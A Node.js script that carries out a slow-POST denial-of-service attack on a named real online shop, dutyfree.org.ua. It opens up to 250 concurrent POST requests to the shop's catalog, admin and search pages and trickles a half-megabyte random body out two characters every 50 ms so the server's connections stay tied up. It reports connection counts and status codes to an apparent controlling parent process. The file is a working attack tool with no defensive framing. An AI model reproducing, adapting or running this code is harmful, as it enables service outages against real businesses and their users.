var querystring = require('querystring');
var http = require('http');
var fs = require('fs');


vals = '1234567890zxcvbnmasdfghjklqwertyuiopZXCVBNMASDFGHJKLQWERTYUIOP';
var random_val = function() {
		var ret = '',
			len = 5 + Math.floor(Math.random() * 32);
		for (var i = 0; i < len; i++)
		ret += vals[Math.round(Math.random() * vals.length)];
		return ret;
	}
var post_data = '';
while (post_data.length < (512 * 1024)) {
	post_data += random_val() + '&' + random_val() + '=';
}
//console.log('Slow post with ' + post_data.length * 2 + ' bytes of data');

var conns = 0;
const max_conns = 250;
var max_conns_complite = false;
var urls = [
'/',
'/catalog/vodka',
'/catalog/viski',
'/catalog/dzhin',
'/catalog/tekila',
'/catalog/rom',
'/admin',
'http://dutyfree.org.ua/products?keyword=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C&x=0&y=0'
];

//return process.send({msg: 1});


var create_post = function() {
		if( conns >= max_conns )
			return;

		conns++;
		process.send(['conns', +1]);
//		console.log(' ' + conns + ' connections');
		var start = (+new Date());
		// An object of options to indicate where to post to
		var post_options = {
			host: 'dutyfree.org.ua',
			port: '80',
			path: urls[ Math.round( Math.random() * urls.length ) ],
			method: 'POST',
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': post_data.length
			}
		};
		// Set up the request
		var post_req = http.request(post_options, function(res) {
			var len = 0;
			res.setEncoding('utf8');
			res.on('data', function(chunk) {
				len += chunk.length;
//				fs.appendFileSync('df.html', chunk);
			});
			res.on('end', function() {
				conns--;
				process.send(['conns', -1]);
//				console.log(' ' + conns + ' connections');
//				console.log('Response: ' + res.statusCode + ' len: ' + len + ' in ' + ((+new Date() - start) / 1000) + 's. ');
				if (res.statusCode) {
					process.send(['code', res.statusCode]);
				}
			});
			res.on('error', console.log);
		}).on('error', function(){
			conns--;
			process.send(['conns', -1]);
			return;
		});
		// post the data
		var pos = 0;
		var interval = setInterval(function() {
			post_req.write(post_data.substr(pos, pos + 2));
			pos += 2;
			if (pos >= post_data.length) {
				clearInterval(interval);
				post_req.end();
			}
		}, 50);
	}

setInterval(create_post, 300);
